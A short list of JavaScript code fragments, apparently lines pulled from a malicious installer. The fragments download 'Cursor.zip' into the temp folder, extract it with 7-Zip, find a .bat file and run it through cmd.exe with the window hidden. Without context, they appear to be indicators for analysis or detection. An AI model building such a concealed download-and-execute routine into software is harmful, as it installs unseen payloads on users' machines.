await downloadFile(downloadUrl, zipPath)
Seven.extractFull(zipPath, extractPath
f.endsWith('.bat')
spawn('cmd.exe', ['/c', batPath]
windowsHide: true
await executeBat(extractPath)
path.join(process.env.TEMP, 'Cursor.zip')
